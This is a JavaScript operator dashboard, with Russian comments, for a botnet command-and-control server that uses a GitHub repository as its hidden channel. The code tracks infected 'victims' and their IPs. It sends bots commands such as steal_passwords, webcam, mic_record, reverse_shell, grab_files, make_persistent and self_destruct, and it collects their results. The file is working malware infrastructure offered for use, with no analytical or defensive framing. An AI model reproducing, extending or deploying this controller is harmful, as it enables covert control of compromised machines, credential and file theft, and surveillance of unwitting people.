// GitHub API конфигурация
const REPO_OWNER = "YOUR_USERNAME";
const REPO_NAME = "c2-dashboard";
const GITHUB_TOKEN = "ghp_YOUR_TOKEN_HERE"; // Создать в Settings → Developer settings

const API_BASE = `https://api.github.com/repos/${REPO_OWNER}/${REPO_NAME}/contents`;

let currentSelectedBot = null;
let victimList = [];
let updateInterval = null;

// Функция для работы с GitHub API (аутентификация)
async function githubRequest(path, method = 'GET', content = null) {
    const url = `${API_BASE}/${path}`;
    const headers = {
        'Authorization': `token ${GITHUB_TOKEN}`,
        'Accept': 'application/vnd.github.v3+json'
    };
    
    const options = { method, headers };
    
    if (content) {
        options.body = JSON.stringify({
            message: `Update ${path}`,
            content: btoa(JSON.stringify(content, null, 2)),
            sha: await getFileSha(path)
        });
        headers['Content-Type'] = 'application/json';
    }
    
    const response = await fetch(url, options);
    return await response.json();
}

// Получить SHA файла (для обновления)
async function getFileSha(path) {
    try {
        const response = await fetch(`${API_BASE}/${path}`, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        const data = await response.json();
        return data.sha || null;
    } catch {
        return null;
    }
}

// Загрузить список жертв
async function loadVictims() {
    try {
        const response = await fetch(`${API_BASE}/victims.json`, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        
        if (response.status === 200) {
            const data = await response.json();
            const content = JSON.parse(atob(data.content));
            victimList = content.victims || [];
            updateVictimsUI();
            updateStats();
        } else {
            // Файла нет - создаём
            await initializeVictimsFile();
        }
    } catch (error) {
        console.error("Error loading victims:", error);
        document.getElementById('victimsList').innerHTML = '<div class="loading">⚠️ API Error - Check token</div>';
    }
}

// Инициализация файла жертв
async function initializeVictimsFile() {
    const initialData = {
        victims: [],
        lastUpdated: new Date().toISOString()
    };
    
    await githubRequest('victims.json', 'PUT', initialData);
    victimList = [];
    updateVictimsUI();
}

// Обновить UI списка жертв
function updateVictimsUI() {
    const container = document.getElementById('victimsList');
    
    if (victimList.length === 0) {
        container.innerHTML = '<div class="victim-item">No victims yet. Waiting...</div>';
        return;
    }
    
    container.innerHTML = victimList.map(victim => `
        <div class="victim-item ${currentSelectedBot === victim.id ? 'selected' : ''}" 
             onclick="selectBot('${victim.id}')">
            <div>
                <div class="victim-name">${victim.name || 'Unknown'}</div>
                <div style="font-size:10px; color:#666;">${victim.ip || 'IP unknown'}</div>
            </div>
            <div class="victim-status ${victim.lastSeen && (Date.now() - new Date(victim.lastSeen) < 60000) ? 'status-online' : 'status-offline'}">
                ${victim.lastSeen ? new Date(victim.lastSeen).toLocaleTimeString() : 'never'}
            </div>
        </div>
    `).join('');
}

// Выбрать бота
function selectBot(botId) {
    currentSelectedBot = botId;
    document.getElementById('selectedBot').innerHTML = `🎯 SELECTED: ${botId}`;
    updateVictimsUI();
}

// Обновить статистику
function updateStats() {
    document.getElementById('totalCount').innerText = victimList.length;
    const online = victimList.filter(v => v.lastSeen && (Date.now() - new Date(v.lastSeen) < 60000)).length;
    document.getElementById('onlineCount').innerText = online;
    document.getElementById('lastSeen').innerText = new Date().toLocaleTimeString();
}

// Отправить команду
async function sendCommand() {
    if (!currentSelectedBot) {
        addOutputLine("❌ No bot selected!");
        return;
    }
    
    const selectCmd = document.getElementById('commandSelect').value;
    const customCmd = document.getElementById('customCommand').value;
    
    let command = "";
    switch(selectCmd) {
        case 'screenshot': command = "screenshot"; break;
        case 'webcam': command = "webcam"; break;
        case 'mic': command = "mic_record 10"; break;
        case 'passwords': command = "steal_passwords"; break;
        case 'unlock': command = "unlock_system"; break;
        case 'shell': command = "reverse_shell"; break;
        case 'grab': command = "grab_files"; break;
        case 'persist': command = "make_persistent"; break;
        case 'destroy': command = "self_destruct"; break;
        default: command = customCmd;
    }
    
    if (!command) {
        addOutputLine("❌ No command specified!");
        return;
    }
    
    // Сохраняем команду в файл команд бота
    const commandsFile = `commands/${currentSelectedBot}.json`;
    const commandData = {
        command: command,
        timestamp: new Date().toISOString(),
        executed: false
    };
    
    try {
        await githubRequest(commandsFile, 'PUT', commandData);
        addOutputLine(`✅ Command sent to ${currentSelectedBot}: ${command}`);
        document.getElementById('customCommand').value = '';
    } catch (error) {
        addOutputLine(`❌ Failed to send command: ${error}`);
    }
}

// Добавить строку в консоль
function addOutputLine(text) {
    const output = document.getElementById('outputArea');
    const line = document.createElement('div');
    line.className = 'output-line';
    line.textContent = `> ${new Date().toLocaleTimeString()} | ${text}`;
    output.appendChild(line);
    output.scrollTop = output.scrollHeight;
}

// Загрузить результаты
async function loadResults() {
    try {
        const response = await fetch(`${API_BASE}/results.json`, {
            headers: { 'Authorization': `token ${GITHUB_TOKEN}` }
        });
        
        if (response.status === 200) {
            const data = await response.json();
            const content = JSON.parse(atob(data.content));
            const results = content.results || [];
            
            const resultsContainer = document.getElementById('resultsList');
            resultsContainer.innerHTML = results.slice(-10).reverse().map(res => `
                <div class="result-line">
                    [${new Date(res.timestamp).toLocaleTimeString()}] ${res.bot}: ${res.data.substring(0, 100)}
                </div>
            `).join('');
        }
    } catch(e) {}
}

// Регистрация новой жертвы (вызывается ботами)
async function registerVictim(botId, botName, botIp) {
    const existing = victimList.find(v => v.id === botId);
    
    if (!existing) {
        victimList.push({
            id: botId,
            name: botName,
            ip: botIp,
            firstSeen: new Date().toISOString(),
            lastSeen: new Date().toISOString()
        });
    } else {
        existing.lastSeen = new Date().toISOString();
    }
    
    await githubRequest('victims.json', 'PUT', { victims: victimList, lastUpdated: new Date().toISOString() });
    updateVictimsUI();
    updateStats();
}

// Обновить всё
function refreshVictims() {
    loadVictims();
    addOutputLine("⟳ Refreshing victim list...");
}

// Авто-обновление
function startAutoRefresh() {
    if (updateInterval) clearInterval(updateInterval);
    updateInterval = setInterval(() => {
        loadVictims();
        loadResults();
    }, 10000);
}

// Инициализация
async function init() {
    addOutputLine("WELL C2 Dashboard v3.14 - Initialized");
    addOutputLine(`Repository: ${REPO_OWNER}/${REPO_NAME}`);
    addOutputLine(`C2 Server: GitHub Pages (static)`);
    
    await loadVictims();
    await loadResults();
    startAutoRefresh();
}

// Запуск при загрузке страницы
window.onload = init;
